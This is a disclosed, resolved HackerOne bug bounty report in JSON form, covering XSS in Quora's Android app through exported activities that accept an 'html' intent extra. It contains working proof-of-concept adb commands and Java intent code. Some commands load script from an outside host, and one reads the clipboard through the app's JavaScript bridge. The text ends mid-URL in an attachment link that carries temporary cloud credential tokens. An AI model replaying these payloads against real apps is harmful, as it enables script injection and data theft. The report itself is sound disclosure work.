{"id":189793,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk3OTM=","url":"https://hackerone.com/reports/189793","title":"[Android] XSS via start ContentActivity","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-09T11:15:23.428Z","submitted_at":"2016-12-09T11:15:23.428Z","is_member_of_team?":false,"is_organization_group_member?":false,"is_triager?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"},"is_me?":false,"cleared":false,"verified":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3152,"url":"https://hackerone.com/quora","handle":"quora","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/57b2b1ab624538b6b1a515c5b03f929ef41e0dfd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"pentest_retesting_ends_at":null,"profile":{"name":"Quora","twitter_handle":"quora","website":"http://www.quora.com","about":"A place to share knowledge and better understand the world."}},"has_bounty?":true,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"submitted_by_team_member":false,"submitted_with_assistant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-04-05T06:23:59.999Z","bug_reporter_agreed_on_going_public_at":"2017-03-06T06:23:43.088Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nXSS via start ContentActivity using 'html' parameter.\n\n**Description (Include Impact):**\nArbitrary applications on Android can run the exported activities ContentActivity, ModalContentActivity and ActionBarContentActivity. Using intent extra parameter `html` we can pass javascript, which will be executed in the context of www.quora.com.\n\nImpact: \n* typical XSS on www.quora.com\n* access to QuoraAndroid JSBridge (for example, ClipboardData )\n* RCE on old Android \u003c= 4.2 (see references)\n\n### Steps To Reproduce\n\n**Using ADB**\nalert(123)\n```\nadb shell\nam start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS\u003cscript\u003ealert(123)\u003c/script\u003e'\n```\nRun script from external host\n```\nam start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '\u003cscript src=//blackfan.ru\u003e\u003c/script\u003e'\nam start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '\u003cscript src=//blackfan.ru\u003e\u003c/script\u003e'\nam start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '\u003cscript src=//blackfan.ru\u003e\u003c/script\u003e'\n```\n\nAccess to ClipboardData\n```\nam start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '\u003cscript\u003ealert(QuoraAndroid.getClipboardData());\u003c/script\u003e'\n```\n\n**Using another app**\n```\nIntent i = new Intent();\ni.setComponent(new ComponentName(\"com.quora.android\",\"com.quora.android.ActionBarContentActivity\"));\ni.putExtra(\"url\",\"http://test/test\");\ni.putExtra(\"html\",\"XSS PoC \u003cscript\u003ealert(123)\u003c/script\u003e\");\nstartActivity(i);\n```\n\n### Your Environment (Browser version, Device, app version, os version etc)\n\n * Nexus 5, Android 6.0.1\n\n### Supporting Material/References (Screenshots)\n\n * https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/\n\n**XSS**\n{F142023}\n\n**Access to ClipboardData**\n{F142024}","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":142023,"file_name":"Screenshot_20161209-150324.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/142/023/0c7763318a5e55e200983bcf5cbcf8de9c96ca7b/Screenshot_20161209-150324.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_20161209-150324.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_20161209-150324.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQHFIXVG3%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T103206Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIE02P0ymQp7XsGcUysuhXUZrw7nLLFHmSG%2BuZBmZEELPAiEA8OYF9%2FlSMvfS6b71uFtYixWqyv2FWthOgNF9F8CpzOUquwUI8v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDM67gtjsF3tU1qLhcCqPBcuzTMk0DmXt1cERCQ2LIzE9bCn39DzFXvJln1g%2FGYXE55jS%2B2%2BFzH%2B7aw3EfmypyyKQRxhPx8FYFJl4qHq9279jDtSt1fSKEmbToMsj674pM0u8It02wGLeuN8CKYGpoOBr6MHcxutM4sIjaLlEdMsAZJYzl2OjKAEXBVPkUhHGxrb4AM%2FDFw2ZYrQuQERHreNvf0xWV1UZhfIud%2B%2BFeIh3IlSNTLH9pMkveu9vso2bDplq6Oq9%2Fuq1WWXCL52FI2DDDZVsRJzWTqaH2vTOfyaGBdiZcdCgwjKEy0wyCeYJXw2TroV2kS6rLKYZQSV5tHGgTRo4P3qtPh9YomABAMDpN1Pf%2B921Hr6kU8lRUPckucgo%2BOfNEGBMPaiPaHd%2BAQDyqwItepil0QLnbuZW907p4MIhb%2BaVvEiYzlv1kp65gL%2BnkFciCwHwyHbrJkkgOdejaW1SgdEIA4nt5FVSgR4zH63IWXGUEvHurp51Bn%2BskxIYhz8G56GTemaiRxPxVcU806olOI6bsCa44%2FHZTYPBVonOPozuvJTO%2BnTFekrXO2OX3gxqSbJvAtB21d26VXfC